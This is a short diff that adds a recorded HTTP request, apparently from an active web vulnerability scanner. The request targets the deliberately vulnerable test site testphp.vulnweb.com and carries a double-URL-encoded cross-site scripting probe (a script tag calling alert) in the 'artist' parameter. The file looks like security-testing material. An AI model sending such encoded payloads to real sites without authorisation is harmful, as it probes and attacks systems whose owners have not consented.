@@ -1,0 +1,10 @@
+GET http://testphp.vulnweb.com/artists.php?artist=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
+
+Headers:
+User-Agent: ExploitFinder-Active/0.3 (+https://example.local)
+Accept-Encoding: gzip, deflate, br, zstd
+Accept: */*
+Connection: keep-alive
+
+Body/data:
+null
